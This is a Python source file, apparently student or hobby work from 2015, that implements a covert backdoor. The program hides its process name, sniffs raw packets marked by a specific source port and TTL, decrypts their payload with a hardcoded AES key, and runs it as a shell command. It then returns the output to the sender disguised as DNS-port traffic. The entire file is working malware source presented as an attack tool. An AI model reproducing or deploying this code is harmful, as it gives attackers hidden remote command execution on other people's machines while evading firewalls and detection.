'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
--  SOURCE FILE:    target.py
--
--  AUTHOR:         Thilina Ratnayake
--              
--  PROGRAM:        Covert back-door that upon running, masks process name and 
--                  listens for commands from an attacker on raw sockets
--                  to circumvent the firewall.
--
--  FUNCTIONS:      sendCommand(string)
--                  craftCommandPacket(string)
--                  encryptCommand(string)
--                  commandResult(packet)
--
--  DATE:           October 17, 2015
--
--  REVISIONS:      
--
--  NOTES:
--  The program requires the PyCrypto and Scapy libraries for encryption and packet
--  crafting respectively.
--  'pip install pycrpyto' or https://www.dlitz.net/software/pycrypto/
--  'pip install scapy' or http://www.secdev.org/projects/scapy/
'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
import sys
from scapy.all import *
import os
from Crypto.Cipher import AES
import setproctitle

global clientIP
global listening


#
# print "GOT HERE!"
# command = raw_input()

#Helper Functions
def decryptCommand(command):
    decryptor = AES.new("0123456789abcdef", AES.MODE_CFB, IV="abcdefghijklmnop")
    plain = decryptor.decrypt(command)
    return plain

def receivedPacket(packet):
    if IP in packet[0]:
        if packet[TCP].sport ==500 and packet[IP].ttl ==71:
            srcIP = packet[IP].src
            print "Packet received"
            # print packet.show
            # print packet["Raw"].load
            command = decryptCommand(packet["Raw"].load)
            # print "Command is " + command
            #Execute the command
            f = os.popen(command)
            result = f.read()
            # print "RESULT IS " + result
            newPacket = (IP(dst=srcIP, ttl=71)/TCP(sport=53, dport=500)/result)
            send(newPacket)
            return True
        else:
            return False




if __name__ == "__main__":

    #Set process title to something less suspicious
    setproctitle.setproctitle("Non-suspicious-program")


    knockCounter = 0


    #As a client, listen for the port knocks
    # print "Waiting for knocks"
    # sniff(filter='udp and src port 514', stop_filter=knockFilter1)
    # sniff(filter='udp and src port 515', stop_filter=knockFilter2)
    # sniff(filter='udp and src port 516', stop_filter=knockFilter3)
    #Listen for connections
    listening = True;
    while listening:
        sniff(filter='tcp and dst port 53 and src port 500', stop_filter=receivedPacket)
